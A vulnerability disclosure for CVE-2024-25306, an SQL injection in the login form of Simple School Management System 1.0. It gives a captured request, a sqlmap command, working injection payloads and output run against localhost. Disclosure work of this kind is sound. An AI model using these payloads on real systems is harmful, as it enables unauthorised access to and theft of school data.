# CVE-2024-25306 - Simple School Managment System - SQL Injection - 1
+ **Exploit Title:** Simple School Managment System - SQL Injection - 1
+ **Date:** 2024-01-02
+ **Exploit Author:** Tuba Kavgacı
+ **Vendor Homepage:** https://code-projects.org/simple-school-management-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/d10e92aa-e37f-46fd-9bf8-45878956d7c0
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** CVE-2024-25306

## Description:
Simple School Managment System 1.0 allows SQL Injection via the 'aname' parameter at "School/index.php". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/School/index.php"
+ Try logging in by typing random things
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /School/index.php HTTP/1.1
Host: localhost
Content-Length: 30
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/School/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=hidk6npo6f802og8sqcir2veul
Connection: close

aname=selam&apass=selam&login=

```

+ Use sqlmap to exploit. In sqlmap, use 'aname' parameter to dump the database.
```
sqlmap -r r.txt -p aname --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: aname (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: aname=selam' OR NOT 2988=2988-- YxQi&apass=selam&login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: aname=selam' AND (SELECT 4921 FROM (SELECT(SLEEP(5)))beXo)-- lkco&apass=selam&login=
---
[04:04:30] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[04:04:30] [INFO] fetching current database
[04:04:30] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[04:04:30] [INFO] retrieved: school
current database: 'school'

```
+ current database: `school`

![Ekran görüntüsü 2024-02-01 122322](https://github.com/tubakvgc/CVEs/assets/74067343/f2cb156e-897c-402d-8233-553a9929b52b)
